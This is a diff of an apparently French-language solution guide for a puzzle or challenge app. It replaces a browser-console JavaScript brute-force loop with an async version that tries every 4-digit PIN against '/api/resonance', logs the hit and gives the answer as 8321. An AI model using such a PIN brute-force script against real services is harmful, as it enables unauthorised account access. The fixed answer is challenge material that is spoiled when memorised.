@@ -106,14 +106,26 @@ src/
 
 ```js
 // F12 → Console → Coller et exécuter :
-for (let i = 0; i <= 9999; i++) {
-  const pin = String(i).padStart(4, '0');
-  fetch('/api/resonance', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ pin })
-  }).then(r => { if (r.ok) console.log('✅ PIN trouvé :', pin); });
+async function hackResonance() {
+  for (let i = 0; i <= 9999; i++) {
+    let pinTest = i.toString().padStart(4, '0');
+    let response = await fetch('/api/resonance', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ pin: pinTest })
+    });
+    if (response.ok) {
+      console.log(`%c✨ SUCCÈS ! Résonance harmonique trouvée avec le PIN : ${pinTest} ✨`, 'color: #00ffcc; font-size: 16px; font-weight: bold;');
+
+      let data = await response.json();
+      console.log("Réponse du serveur :", data);
+
+      break;
+    }
+  }
 }
+
+hackResonance();
 // Résultat affiché dans la console → PIN : 8321
 // → Entrer 8321 dans le champ et valider
 ```
